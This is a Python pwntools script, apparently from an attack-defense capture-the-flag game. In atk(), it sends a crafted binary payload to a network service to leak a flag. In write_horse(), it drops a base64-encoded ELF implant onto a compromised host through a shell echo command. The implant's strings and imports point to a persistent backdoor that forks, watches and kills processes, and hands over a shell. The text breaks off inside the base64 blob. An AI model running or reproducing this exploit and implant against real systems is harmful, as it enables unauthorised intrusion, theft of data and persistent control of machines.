from pwn import *
import requests
import json
import re
import time 
# response = requests.post("https://10.13.40.112:13864/login", data=json.dumps(data), verify=False, timeout=3)
# context(log_level="debug")
# print(response.status)

def atk(ip, port):
    try:
        r = remote(ip, port , ssl=False)
    except:
        return 'down'
    print("HOST:%s"%ip)

    
    try:
        # flag = re.findall(r'won.\\n(.*?)\\n',data.decode())[0] # data must be bytes , regex match the flag from data
        r.write(b"315\n")
        r.recv()
        r.write(b'\x0b\x0c\x00\x00\x00\x00\x00\x01\x06\x00\x00\xfe\x1f\x00\x01\x06\x00\x00\xfe\x1f\x00\x01\x06\x00\x00\xfe\x1f\x00\x01\x06\x00\x00\xfe\x1f\x00\x01\x06\x00\x00\xfe\x1f\x00\x07\xf9\x1f\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x04\x04\x00\x00\x04\x00\x00\x02\x02\x00\x00\xff\xff\x00\x07\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x01\x02\x00\x00\xf4\xff\x00\x11\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x02\x01\x00\x00\x04\x00\x00\x02\x05\x00\x00\x03\x00\x00\x01\xfc\xff\x00\xfc\xff\x00\x02\x03\x00\x00\xfd\xff\x00\x02\x03\x00\x00\x05\x00\x00\x0b\x01\x00\x00\x05\x00\x00\x02\xfb\xff\x00\x05\x00\x00\x0b\xfb\xff\x00\x04\x00\x00\x02\x04\x00\x00\x04\x00\x00\x01\xfd\xff\x00\x03\x00\x00\x0b\x05\x00\x00\xff\xff\x00\x0b\x02\x00\x00\x02\x00\x00\x01\xfc\xff\x00\x00\x00\x00\x02\x03\x00\x00\x01\x00\x00\x01\xfc\xff\x00\x03\x00\x00\x01\xfe\xff\x00\x00\x00\x00\x0b\xfc\xff\x00\x04\x00\x00\x02\xfe\xff\x00\xfd\xff\x00\x02\x03\x00\x00\x05\x00\x00\x01\xff\xff\x00\x04\x00\x00\x0b\x00\x00\x00\xff\xff\x00\x02\x03\x00\x00\x03\x00\x00\x02\x04\x00\x00\x03\x00\x00\x0b\x00\x00\x00\xfc\xff\x00\x0b\xfe\xff\x00\xfd\xff\x00\x01\xfb\xff\x00\xfd\xff\x00\x01\xfe\xff\x00\xfe\xff\x00\x01\x02\x00\x00\x02\x00\x00\x01\x03\x00\x00\x03\x00\x00\x01\x02\x00\x00\xfc\xff\x00')
        for i in range(11):
            r.recvline() ## grep flag
        data = r.recvline()
        # print(data) 
        r.close()
        flag = data.decode().replace('\n','')
        print(flag)
        return flag
    except:        
        return 'patched'


def write_horse(ip, port):
    print("HOST:%s"%ip)
    try:
        r = remote(ip, port , ssl=False)
        '''
        exploit, last step is /bin/sh
        '''
        r.sendline(b'echo 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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXdLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXiLwAA/yXkLwAADx9AAP8l4i8AAGgAAAAA6eD/////JdovAABoAQAAAOnQ/////yXSLwAAaAIAAADpwP////8lyi8AAGgDAAAA6bD/////JcIvAABoBAAAAOmg/////yW6LwAAaAUAAADpkP////8lsi8AAGgGAAAA6YD/////JaovAABoBwAAAOlw/////yWiLwAAaAgAAADpYP////8lmi8AAGgJAAAA6VD/////JZIvAABoCgAAAOlA/////yWKLwAAaAsAAADpMP////8lgi8AAGgMAAAA6SD/////JXovAABoDQAAAOkQ/////yVyLwAAaA4AAADpAP////8lai8AAGgPAAAA6fD+////JcIuAABmkAAAAAAAAAAAMe1JidFeSIniSIPk8FBUTI0F2gYAAEiNDXMGAABIjT1LBgAA/xV2LgAA9A8fRAAASI09MS8AAEiNBSovAABIOfh0FUiLBU4uAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI09AS8AAEiNNfouAABIKf5IifBIwe4/SMH4A0gBxkjR/nQUSIsFJS4AAEiFwHQI/+BmDx9EAADDDx+AAAAAAIA94S4AAAB1L1VIgz0GLgAAAEiJ5XQMSIs9oi4AAOgt////6Gj////GBbkuAAABXcMPH4AAAAAAww8fgAAAAADpe////1VIieVIg+wQSIl9+EiLRfi+AAAAAEiJx+iO/v//hcAPlMAPtsDJw1VIieVIgewgAQAAib3s/v//SMeF8P7//wAAAABIx4X4/v//AAAAAEiNlQD///+4AAAAALkdAAAASInX80irSIn6iQJIg8IEZokCSIPCAogCSIPCAYuF7P7//4nGSI09VQ0AALgAAAAA6Nf9//+Llez+//9IjYXw/v//SI01VQ0AAEiJx7gAAAAA6Cb+//9IjYXw/v//SInH6Dz///+JRfyDffwAdeiLhez+//+JxkiNPSoNAAC4AAAAAOiF/f//uAAAAADomgQAAL8AAAAA6PH9//9VSInlSIHskAEAAEjHhXD///8AAAAASMeFeP///wAAAABIx0WAAAAAAEjHRYgAAAAASMdFkAAAAABIx0WYAAAAAEjHRaAAAAAASMdFqAAAAABIx0WwAAAAAEjHRbgAAAAASMdFwAAAAABIx0XIAAAAAEjHRdAAAAAASMdF2AAAAABIx0XgAAAAAEjHRegAAAAASMeFcP7//wAAAABIx4V4/v//AAAAAEjHhYD+//8AAAAASMeFiP7//wAAAABIx4WQ/v//AAAAAEjHhZj+//8AAAAASMeFoP7//wAAAABIx4Wo/v//AAAAAEjHhbD+//8AAAAASMeFuP7//wAAAABIx4XA/v//AAAAAEjHhcj+//8AAAAASMeF0P7//wAAAABIx4XY/v//AAAAAEjHheD+//8AAAAASMeF6P7//wAAAABIx4Xw/v//AAAAAEjHhfj+//8AAAAASMeFAP///wAAAABIx4UI////AAAAAEjHhRD///8AAAAASMeFGP///wAAAABIx4Ug////AAAAAEjHhSj///8AAAAASMeFMP///wAAAABIx4U4////AAAAAEjHhUD///8AAAAASMeFSP///wAAAABIx4VQ////AAAAAEjHhVj///8AAAAASMeFYP///wAAAABIx4Vo////AAAAAMdF/AAAAADrZItV/EiNhXD///9IjTUVCwAASInHuAAAAADoyfv//0iNjXD+//9IjYVw////ugABAABIic5Iicfo6/r//0iNhXD+//+6BgAAAEiNNegKAABIicfoQPv//4XAdQWLRfzrD4NF/AGDffwTfpa4/////8nDVUiJ5UiB7CABAAC+AQAAAL8RAAAA6Bz7///od/v//4XAD4X7AQAA6Jr6//+JRfzoYvv//4lF+IN9+AAPhR8BAADo0Pr//7gAAAAA6EX9//+JRfCDffD/dFJIiwXWKgAAvgAAAABIicfoafr//0iLBbIqAAC+AAAAAEiJx+hV+v//SIsFrioAAInCi0XwicaJ1+hg+v//SIsFiSoAAInCi0XwicaJ1+hL+v//6Bb6//+JwYtF/InCic5IjT0NCgAAuAAAAADoPPr//4tV/EiNReiJ0UiNFej7//++AAAAAEiJx7gAAAAA6Lr5//9Ix4Xg/v//AAAAAEjHhej+//8AAAAASI2V8P7//7gAAAAAuR0AAABIidfzSKtIifqJAkiDwgRmiQJIg8ICiAJIg8IBSI2F4P7//0iJxkiNPaAJAAC4AAAAAOgc+v//SI2F4P7//0iJx7gAAAAA6Ij5///rjLgAAAAA6Cv8//+JRfSDffT/dFJIiwW8KQAAvgAAAABIicfoT/n//0iLBZgpAAC+AAAAAEiJx+g7+f//SIsFlCkAAInCi0X0icaJ1+hG+f//SIsFbykAAInCi0X0icaJ1+gx+f//i0X4iUX86Pb4//+JwYtF/InCic5IjT3tCAAAuAAAAADoHPn//4tV/EiNReCJ0UiNFcj6//++AAAAAEiJx7gAAAAA6Jr4//9Ii0XgvgAAAABIice4AAAAAOg0+f//kMnDVUiJ5bgAAAAA6M39//+4AAAAAF3DZi4PH4QAAAAAAGaQQVdMjT3/JQAAQVZJidZBVUmJ9UFUQYn8VUiNLfAlAABTTCn9SIPsCOgD+P//SMH9A3QbMdsPHwBMifJMie5EiedB/xTfSIPDAUg53XXqSIPECFtdQVxBXUFeQV/DDx8AwwAAAEiD7AhIg8QIwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAY2hpbGQgdGhyZWFkIHN0YXJ0LCB3YXRjaCAlZAoAL3Byb2MvJWQAJWQgaGFzIGJlZW4ga2lsbGVkCgAvcHJvYy9zZWxmL2ZkLyVkAHNvY2tldABJIGFtICVkLCB3YXRjaCAlZAoAJXMAAAAAARsDO1wAAAAKAAAAsO///6gAAADA8P//0AAAANDw//94AAAAtfH//+gAAADc8f//CAEAAK/y//8kAQAAGvX//0QBAAA/9///ZAEAAGD3//+IAQAAwPf//9ABAAAAAAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQcQFAAAABwAAABQ8P//KwAAAAAAAAAAAAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQAAJAAAABwAAAAA7///EAEAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAABQAAABEAAAA6O///wgAAAAAAAAAAAAAABwAAABcAAAAxfD//ycAAAAAQQ4QhgJDDQZiDAcIAAAAGAAAAHwAAADM8P//0wAAAABBDhCGAkMNBgAAABwAAACYAAAAg/H//2sCAAAAQQ4QhgJDDQYDZgIMBwgAHAAAALgAAADO8///JQIAAABBDhCGAkMNBgMgAgwHCAAgAAAA2AAAANP1//8VAAAAAEEOEIYCQw0GUAwHCAAAAAAAAABEAAAA/AAAAND1//9dAAAAAEIOEI8CSQ4YjgNFDiCNBEUOKIwFRA4whgZIDjiDB0cOQGoOOEEOMEEOKEIOIEIOGEIOEEIOCAAQAAAARAEAAOj1//8BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA